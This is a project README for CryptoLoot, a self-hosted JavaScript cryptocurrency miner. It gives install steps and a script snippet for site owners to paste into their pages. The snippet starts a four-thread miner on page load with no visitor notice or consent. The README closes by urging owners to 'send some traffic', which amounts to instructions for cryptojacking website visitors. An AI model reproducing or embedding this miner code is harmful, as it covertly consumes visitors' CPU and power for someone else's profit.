# cryptoloot

Self Hosted Library for CryptoLoot
==================================

How to Install:
1) Download https://github.com/Crypto-Loot/cryptoloot/archive/master.zip and uncompress at yoursite.com home directory
or alternatively use ```text git clone https://github.com/Crypto-Loot/cryptoloot.git```
2) Register at https://crypto-loot.com to get your public site ID, you'll need this for the next step.
3) Add the script to your website, preferably ABOVE </body> tag, and not within the <head></head> tags. Make sure to edit YOUR_PUBLIC_KEY with your site ID from crypto-loot.com:
```text
<script src="lib/miner.min.js"></script>
<script>
	CryptoLoot.CONFIG.LIB_URL: "https://yourwebsite.com/lib/";
            var miner=new CryptoLoot.Anonymous('YOUR_PUBLIC_KEY', {
                threads:4,autoThreads:false,throttle:0.2,
            });
        miner.start();
</script>
```
NOTE: Also, edit your website domain above and point that to your lib directory.

4) All set. Now just send some traffic!


Have any questions?
===================
Feel free to contact as at https://crypto-loot.com
